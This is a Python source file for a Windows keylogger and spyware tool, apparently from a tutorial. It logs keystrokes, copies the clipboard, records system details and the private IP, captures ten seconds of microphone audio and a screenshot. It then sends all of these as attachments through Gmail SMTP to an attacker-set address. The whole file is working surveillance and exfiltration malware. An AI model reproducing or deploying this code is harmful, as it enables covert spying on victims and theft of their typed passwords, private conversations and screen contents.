import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import win32clipboard
import platform
import socket
from pynput.keyboard import Key, Listener
import time
import sys
import os
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab

# Set the duration for capturing keystrokes
duration = 10  # Time in seconds

# Set the file paths and names
file_path = "D:\\pythonProject\\pyth\\"
extend = "\\"
clipboard_information = "clipinfo.txt"
system_information = "systeminfo.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

# Set up the email configuration
smtp_port = 587  # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server
email_from = "yourmail@gmail.com"
email_list = ["receivers_mail@gmail.com"]
pswd = "password"  # As shown in the video this password is now dead, left in as an example only
subject = "New email from TIE with attachments!!"


def send_emails(email_list):
    for person in email_list:
        # Make the body of the email
        body = """
        hiii this is your email with files

        use this properly plz

        etc
        """

        # Make a MIME object to define parts of the email
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # Attach the body of the message
        msg.attach(MIMEText(body, 'plain'))

        # Define the file attachments
        attachment_files = [keys_information, clipboard_information, system_information, audio_information,
                            screenshot_information]

        for attachment_file in attachment_files:
            attachment = open(file_path + extend + attachment_file, 'rb')
            attachment_package = MIMEBase('application', 'octet-stream')
            attachment_package.set_payload((attachment).read())
            encoders.encode_base64(attachment_package)
            attachment_package.add_header('Content-Disposition', "attachment; filename= " + attachment_file)
            msg.attach(attachment_package)

        text = msg.as_string()

        # Connect to the server
        print("Connecting to the server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Successfully connected to the server")
        print()

        # Send email to the recipient
        print(f"Sending email to: {person}...")
        TIE_server.sendmail(email_from, person, text)
        print(f"Email sent to: {person}")
        print()

    # Close the server connection
    TIE_server.quit()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")


def computer_information():
    with open(file_path + extend + system_information, 'w') as f:
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n \n ")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_address + "\n")


def microphone():
    fs = 44100
    seconds = 10

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


def on_press(key):
    global keys, start_time

    keys.append(key)

    # Check if the duration has passed
    elapsed_time = time.time() - start_time
    if elapsed_time >= duration:
        write_file(keys)
        sys.exit()


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        f.close()


def on_release(key):
    if key == Key.esc:
        return False


# Start capturing keystrokes
keys = []
start_time = time.time()
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# Perform other operations (copy clipboard, computer info, microphone, screenshot)
copy_clipboard()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
computer_information()
microphone()
screenshot()

# Wait for the specified duration
time.sleep(duration)

# Stop capturing keystrokes
listener.stop()

# Run the function to send emails with captured information
send_emails(email_list)
